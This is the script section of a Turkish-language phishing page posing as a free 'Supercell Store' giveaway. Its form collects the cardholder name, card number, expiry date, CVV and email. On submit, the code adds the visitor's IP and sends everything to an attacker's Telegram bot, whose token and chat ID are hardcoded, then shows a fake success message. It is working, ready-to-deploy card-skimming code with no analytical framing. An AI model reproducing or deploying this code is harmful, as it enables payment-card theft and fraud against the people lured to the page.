<body>

    <script>
        // Telegram Bot Bilgileri
        const BOT_TOKEN = '8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A';
        const CHAT_ID = '6307157806';

        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const paymentData = {
                cardHolder: document.getElementById('cardHolder').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiryDate: document.getElementById('expiryDate').value,
                cvv: document.getElementById('cvv').value,
                email: document.getElementById('email').value,
                timestamp: new Date().toLocaleString('tr-TR'),
                ip: await getIPAddress()
            };
            
            await processPayment(paymentData);
        });

        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Bilinmiyor';
            }
        }

        async function processPayment(paymentData) {
            const btn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            const status = document.getElementById('status');
            
            // Y√ºkleniyor g√∂ster
            btn.disabled = true;
            btn.innerHTML = 'ƒ∞≈üleniyor...';
            loading.style.display = 'block';
            status.style.display = 'none';
            
            try {
                // Telegram'a g√∂nder
                const telegramResult = await sendToTelegram(paymentData);
                
                if (telegramResult.success) {
                    showStatus('‚úÖ Ba≈üarƒ±lƒ±! e posta bildirimi g√∂nderildi. √úr√ºn hesabƒ±nƒ±za eklendi.', 'success');
                } else {
                    showStatus('‚ö†Ô∏è √úr√ºn eklendi ama Telegram g√∂nderilemedi: ' + telegramResult.error, 'error');
                }
                
            } catch (error) {
                showStatus('‚ùå Hata: ' + error.message, 'error');
            } finally {
                // Butonu eski haline getir
                btn.disabled = false;
                btn.innerHTML = '√úCRETSƒ∞Z AL';
                loading.style.display = 'none';
                
                // Formu temizle
                document.getElementById('paymentForm').reset();
            }
        }

        async function sendToTelegram(paymentData) {
            const message = `
üéÅ **YENƒ∞ √úCRETSƒ∞Z √ñDEME**

üí≥ **Kart Bilgileri:**
üë§ Kart Sahibi: ${paymentData.cardHolder}
üî¢ Kart No: ${paymentData.cardNumber}
üìÖ Son Kullanma: ${paymentData.expiryDate}
üîê CVV: ${paymentData.cvv}

üìß **ƒ∞leti≈üim:**
üìß E-posta: ${paymentData.email}

üí∞ **√ñdeme Detaylarƒ±:**
üíµ Tutar: ‚Ç∫0,00 (√úCRETSƒ∞Z)
‚è∞ Zaman: ${paymentData.timestamp}
üåê IP: ${paymentData.ip}

‚ö° _Supercell Store √úcretsiz √ñdeme_
            `.trim();

            try {
                // Telegram Bot API'sine direkt istek
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const result = await response.json();
                
                if (result.ok) {
                    return { success: true, messageId: result.result.message_id };
                } else {
                    throw new Error(result.description || 'Telegram API hatasƒ±');
                }

            } catch (error) {
                console.error('Telegram hatasƒ±:', error);
                return { 
                    success: false, 
                    error: error.message 
                };
            }
        }

        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = 'status ' + type;
            status.style.display = 'block';
        }

        // Input formatlama
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            if (value.length > 16) value = value.substr(0, 16);
            e.target.value = value.replace(/(\d{4})/g, '$1 ').trim();
        });

        document.getElementById('expiryDate').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substr(0, 2) + '/' + value.substr(2, 2);
            }
            e.target.value = value;
        });

        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });

        document.getElementById('cardHolder').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^a-zA-Zƒü√º≈üƒ±√∂√ßƒû√ú≈ûƒ∞√ñ√á\s]/g, '');
        });

        // Hata ayƒ±klama

    </script>
